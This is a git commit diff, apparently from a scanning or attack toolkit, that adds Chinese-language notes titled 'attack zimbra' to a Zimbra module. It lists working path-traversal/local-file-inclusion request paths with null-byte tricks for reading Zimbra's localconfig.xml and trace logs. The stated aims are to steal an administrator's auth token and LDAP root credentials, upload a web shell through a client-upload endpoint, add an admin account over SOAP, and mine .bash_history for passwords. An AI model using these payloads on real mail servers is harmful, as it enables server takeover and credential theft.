d4338936b5d8804ad5d4a70c6340fb83c4a182b3
p0nytaiL <ponytail@ponytails.local>
2016-05-07 11:03:17 +0300

    commit
    attack zimbra

--- PackageScanner/Functions/Host/MailServer/Servers/Zimbra/zimbra.py
+++ PackageScanner/Functions/Host/MailServer/Servers/Zimbra/zimbra.py
@@ -15,15 +15,30 @@ bypass
 Zimbra Local File Inclusion
 https://packetstormsecurity.com/files/124321/Zimbra-Local-File-Inclusion.html
 
+任意文件读取
+php.ini
+httpd.conf
+
+
+任意文件读取
 /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
 /zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
 
-本地文件包含,获取authtoken,上传shell到/download目录下
-上传地址 /service/extension/clientUploader/upload
+
+读取日志,获取当前登录的管理的AUTH_TOKEN
+/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/log/2016_05_05.trace.log
+
+上传shell到download目录下
+/service/extension/clientUploader/upload
+
 
 获取authtoken获取方式
-    读取ldap root账户,通过soap接口添加管理员账户,
+    读取ldap root账户,通过soap接口添加管理员账户
+        /opt/zimbra/conf/localconfig.xml
     读取session,获取authtoken
+        /opt/zimbra/log/2016_05_05.trace.log    好像要开启什么设置才有
+        /opt/zimbra/.bash_history   这里有概率出现管理员密码
+
 
 
 
